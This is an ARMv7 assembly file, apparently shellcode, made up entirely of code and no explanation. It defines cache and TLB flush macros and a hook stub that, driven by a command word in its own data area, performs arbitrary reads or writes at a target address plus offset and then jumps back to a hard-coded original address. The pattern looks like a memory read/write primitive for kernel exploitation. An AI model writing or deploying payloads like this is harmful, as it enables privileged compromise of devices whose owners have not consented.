.align 4
.arm
.global _start

.macro mov32
    movw $0, #(($1) & 0xffff)
    movt $0, #((($1) >> 16) & 0xffff)
.endmacro

// flush pte
.macro fpte
    dsb
    mcr     p15, #0x0, $0, c8, c7, #0x1 
    dsb
    isb
.endmacro

// flush data
.macro fdata
    dsb
    mcr     p15, #0x0, $0, c7, c14, #0x1
    dsb
    isb
.endmacro

_start:
    adr     r12, _command
    ldr     r8, [r12]

    cmp     r8, #0x1
    beq     L_done

    cmp     r8, #0x0
    beq     L_done

    mov     r9, #0
    str     r9, [r12]
    fdata   r12

    cmp     r8, #0x2
    beq     L_physread
    cmp     r8, #0x3
    beq     L_physwrite
    b       L_cleanup

L_physread:
    adr     r2, _offset
    ldr     r2, [r2]
    adr     r12, _target_va
    ldr     r12, [r12]
    fpte    r12
    add     r12, r12, r2

    ldr     r10, [r12]
    adr     r2, _value
    str     r10, [r2]
    fdata   r2
    b       L_cleanup
    
L_physwrite:
    adr     r2, _offset
    ldr     r2, [r2]
    adr     r12, _target_va
    ldr     r12, [r12]
    fpte    r12
    add     r12, r12, r2

    adr     r2, _value
    ldr     r2, [r2]
    str     r2, [r12]
    fdata   r12

L_cleanup:
    adr     r12, _command
    mov     r2, #0x1
    str     r2, [r12]
    fdata   r12


L_done:
    adr     r12, _orig_addr
    ldr     r12, [r12]
    bx      r12


_command:   .long 0x1
_offset:    .long 0x0
_value:     .long 0x0
_orig_addr: .long 0x1000848
_target_va: .long 0x10a4000


/*
as -arch armv7 shc.s -o test.o && /usr/bin/otool -tvVj test.o
*/
